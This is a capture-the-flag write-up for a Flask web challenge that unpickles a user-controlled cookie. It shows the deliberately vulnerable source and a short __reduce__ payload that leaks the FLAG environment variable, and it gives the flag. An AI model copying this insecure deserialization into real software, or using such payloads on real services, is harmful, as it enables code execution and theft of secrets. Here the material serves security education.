# Jar
**Category: Web**

This challenge has a text input box, and the strings you enter get displayed on the page. The challenge source was provided:

```python
from flask import Flask, send_file, request, make_response, redirect
import random
import os

app = Flask(__name__)

import pickle
import base64

flag = os.environ.get('FLAG', 'actf{FAKE_FLAG}')

@app.route('/pickle.jpg')
def bg():
	return send_file('pickle.jpg')

@app.route('/')
def jar():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	return '<form method="post" action="/add" style="text-align: center; width: 100%"><input type="text" name="item" placeholder="Item"><button>Add Item</button><img style="width: 100%; height: 100%" src="/pickle.jpg">' + \
		''.join(f'<div style="background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;">{item}</div>' for item in items)

@app.route('/add', methods=['POST'])
def add():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	items.append(request.form['item'])
	response = make_response(redirect('/'))
	response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))
	return response

app.run(threaded=True, host="0.0.0.0")
```
From reading the challenge source, we can see that the text we submit gets serialized with the `pickle` module, and then stored (in base64) in a cookie. Then the values in the cookie will be printed on the page. Also, the flag is stored in the `FLAG` environment variable, and we have to figure out some way to print it.

I did a bit of research in the Pickle documentation to see what it was all about:

> The pickle module implements binary protocols for serializing and de-serializing a Python object structure. “Pickling” is the process whereby a Python object hierarchy is converted into a byte stream, and “unpickling” is the inverse operation, whereby a byte stream (from a binary file or bytes-like object) is converted back into an object hierarchy.



The pickle documentation also states:

> Warning The pickle module is not secure. Only unpickle data you trust.
It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.

Sounds good. Let's try and do some of that. Pickle lets you specify a custom way to serialize a class with the `__reduce__` method. We can use this to create a class that serializes with the flag information. This exploit program will make us a cookie that can give us the flag:

```python
#!/usr/bin/env python3
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.getenv, ('FLAG',))

pickled = pickle.dumps([RCE()])
print(base64.urlsafe_b64encode(pickled).decode()) # gASVHwAAAAAAAABdlIwCb3OUjAZnZXRlbnaUk5SMBEZMQUeUhZRSlGEu
```

Inserting this cookie into the browser and refreshing the page revealed our flag! `actf{you_got_yourself_out_of_a_pickle}`
